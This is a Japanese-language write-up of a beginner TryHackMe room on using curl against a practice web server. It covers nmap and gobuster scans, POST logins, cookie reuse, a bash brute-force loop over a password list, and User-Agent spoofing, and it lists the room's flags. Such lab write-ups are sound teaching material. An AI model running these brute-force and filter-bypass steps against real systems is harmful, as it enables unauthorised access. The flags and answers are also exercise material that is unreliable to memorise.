---
tags: [hacking, box, writeup, tryhackme, aoc2025, curl, web]
platform: TryHackMe
difficulty: Easy
status: completed
date: 2026-01-13
skills:
  - Nmap (ポートスキャン・脆弱性スキャン)
  - Gobuster (ディレクトリ列挙)
  - curl (GET/POST, Cookie, ブルートフォース, UA偽装)
room: webhackingusingcurl-aoc2025-w8q1a4s7d0
os: Linux (Ubuntu)
---

# Web Hacking Using cURL (AoC2025 W8)

**プラットフォーム**: TryHackMe (Advent of Code 2025 Week8)
**難易度**: Easy
**OS**: Linux (Ubuntu)
**テーマ**: curl を使ったWeb操作の基礎

---

## 攻略フロー概要

```
ポートスキャン (Nmap)
  → ディレクトリ列挙 (Gobuster)
  → curl で GET/POST → フラグ取得
  → Cookie保存・再利用 → フラグ取得
  → bash ループでブルートフォース → パスワード特定
  → User-Agent偽装 → フラグ取得
```

---

## 1. ポートスキャン

### 開いているポート

```bash
nmap -sT -P0 $IP
```

| ポート | サービス | バージョン |
|-------|---------|----------|
| 22/tcp | SSH | OpenSSH 8.9p1 (Ubuntu) |
| 80/tcp | HTTP | Apache httpd 2.4.52 (Ubuntu) |

### 重要な発見

- ブラウザ（HTTP 1.1）でアクセスすると `Access denied. Please use your terminal.` と返される
- HTTP/1.0 の GET / では 200 OK が返る → curl での操作が前提の設計

```bash
# ブラウザからは拒否される
# HTTP/1.1: "Access denied. Please use your terminal."
# HTTP/1.0: 200 OK
```

### 脆弱性スキャン

```bash
nmap -p 22,80 --script vuln $IP
# → CSRF・XSS・DOM XSS いずれも検出なし
```

---

## 2. ディレクトリ列挙

### /etc/hosts 登録

```bash
echo "$IP nmap.org" >> /etc/hosts
```

### Gobuster

```bash
gobuster dir -u 'http://nmap.org' -w /usr/share/wordlists/dirb/common.txt -t 200
```

| パス | ステータス |
|-----|---------|
| `/index.php` | 200 |
| `/.htaccess` | 403 |
| `/server-status` | 403 |

---

## 3. curl 基礎操作

### GET リクエスト

```bash
curl -X GET http://nmap.org
# → Welcome to the cURL practice server!
#    Try sending a POST request to /post.php
```

### POST リクエスト

```bash
# まず形式を確認
curl -X GET http://nmap.org/post.php
# → Send POST data like username=admin&password=admin

# POST でログイン
curl -X POST http://nmap.org/post.php -d 'username=admin&password=admin'
# → Login successful!
#    Flag: THM{curl_post_success}
```

> **ポイント**: `-d` でフォームデータを送る。`Content-Type: application/x-www-form-urlencoded` が自動付与される。

---

## 4. Cookie の保存と再利用

### Cookie を保存してログイン

```bash
# -c COOKIEFILE でCookieをファイルに保存
curl -c cookies.txt -d "username=admin&password=admin" http://$IP/session.php
# → Login successful. Cookie set.
```

### 保存した Cookie を使って再アクセス

```bash
# -b COOKIEFILE で保存済みCookieを送信
curl -b cookies.txt http://$IP/session.php
# → Welcome back, admin!
#    Flag: THM{session_cookie_master}
```

> **ポイント**: `-c` で保存、`-b` で読み込み。Cookie が有効な間は再認証不要になる。

---

## 5. bash ループでブルートフォース

### パスワードリスト

```
passwords.txt
---
admin123
password
letmein
secretpass
secret
```

### ブルートフォーススクリプト

```bash
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://$IP/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```

**実行結果**:
```
Trying password: admin123
Trying password: password
Trying password: letmein
Trying password: secretpass
[+] Password found: secretpass
```

> **ポイント**: `curl -s` でサイレントモード（プログレスバー非表示）。`grep -q` でマッチを判定。

---

## 6. User-Agent 偽装

一部のアプリはブラウザ判定のため `User-Agent` ヘッダーをチェックする。

```bash
# デフォルト UA は拒否される
curl -i http://$IP/ua_check.php
# → HTTP/1.1 403 Forbidden
#    Blocked: Only internalcomputer useragents are allowed.

# -A でカスタムUAを指定
curl -A "internalcomputer" http://$IP/ua_check.php
# → Welcome Internal Computer!
```

```bash
# AoC2025 ボーナス問題
curl -A 'TBFC' http://$IP/agent.php
# → Flag: THM{user_agent_filter_bypassed}
```

> **ポイント**: `-A "文字列"` または `-H "User-Agent: 文字列"` で UA を偽装できる。

---

## フラグ一覧

| 問題 | フラグ |
|-----|-------|
| POST ログイン | `THM{curl_post_success}` |
| Cookie 再利用 | `THM{session_cookie_master}` |
| UA 偽装 (`TBFC`) | `THM{user_agent_filter_bypassed}` |
| ブルートフォース正解パスワード | `secretpass` |

---

## 習得スキル・学び

### curl オプション早見表

| オプション | 意味 | 使いどころ |
|----------|------|----------|
| `-X POST` | HTTPメソッド指定 | POST/PUT/DELETE |
| `-d "key=val"` | POSTデータ送信 | フォームデータ |
| `-c FILE` | Cookieを保存 | ログイン後のセッション保存 |
| `-b FILE` | Cookieを送信 | 保存済みセッションの再利用 |
| `-A "UA"` | User-Agent指定 | UA制限の回避 |
| `-H "Key: Val"` | 任意ヘッダー追加 | 認証ヘッダー等 |
| `-s` | サイレントモード | スクリプト内での利用 |
| `-i` | レスポンスヘッダーも表示 | デバッグ |
| `-L` | リダイレクトに追従 | 302応答のある場合 |

### 重要な考え方

- **ブラウザとcurlの違いを理解する**: UA・Cookieの挙動を把握する
- **レスポンスの差分を観察する**: ステータスコード・メッセージの違いが手がかりになる
- **bash + curl でスクリプト化**: 繰り返し操作はループで自動化できる

## ハマったポイント

- `nmap.org` の /etc/hosts 登録が必要（IPだけではアクセスできない設計）
- gobuster でディレクトリ列挙するだけでは `post.php` が見えない → curl の GET レスポンスにヒントがあった

## 参考リンク

- [TryHackMe Room](https://tryhackme.com/room/webhackingusingcurl-aoc2025-w8q1a4s7d0)
- [[Tools/curl-cheatsheet]] ← 作成推奨
